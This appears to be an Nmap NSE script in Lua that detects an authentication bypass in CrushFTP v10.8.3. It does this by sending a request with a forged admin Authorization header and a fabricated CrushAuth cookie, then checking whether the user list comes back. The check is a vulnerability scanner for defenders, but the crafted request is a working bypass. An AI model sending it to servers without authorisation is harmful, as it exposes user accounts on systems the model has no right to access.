local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
math.randomseed(os.time())
description = [[
  This script is intended to detect the authentication bypass vulnerability in CrushFTP v10.8.3 by sending crafted HTTP requests and analying the response to determine if the server can be accessed without valid credentials.
]]

-- @usage
-- nmap -p 8080 --script=crushftp-auth-bypass <target>
--
-- @output
-- PORT STATE SERVICE
-- 8080/tcp open http
-- | crushftp-auth-bypass:
-- |  Result: Vulnerable (bypass successful)
--
author = "Mohamed Trigui"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

-- Run the script on the open HTTP ports
portrule = shortport.http

local function random_digits(length)
	local s = ""
	for i = 1, length do
		s = s .. tostring(math.random(0, 9))
	end
	return s
end

local function random_alphanum(length)
        local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        local s = ""
        for i = 1, length do
		local rand_index = math.random(1, #charset)
		s = s .. charset:sub(rand_index, rand_index)
  end
  return s
end

action = function(host, port)

   -- 1.  Generating fake tokens
   local c2f = random_digits(4)
   local ts13 = random_digits(13)
   local rand = random_alphanum(28)

   -- 2.  Building path
   local path = ("/WebInterface/function/?command=getUserList&c2f=%s")
                :format(c2f)
   
   -- 3.  Craft the headers and cookies
   local headers = {
	   ["Authorization"] = "AWS4-HMAC-SHA256 Credential=crushadmin/",
	   ["Cookie"] = ("CrushAuth=%s_%s%s; currentAuth=%s"):format(ts13, rand, c2f, c2f),
	   ["X-Requested-With"] = "XMLHttpRequest",
   }
   -- 4.  Send request
   local response = http.get(host, port, path, { header = headers })

   -- 5. Check for bypass
   if response.status == 200 and response.body:find("<user_list_submitem>") then
     return stdnse.format_output(
	 true, "VULNERABLE: unauthenticated user list exposed"
 )
 end

end
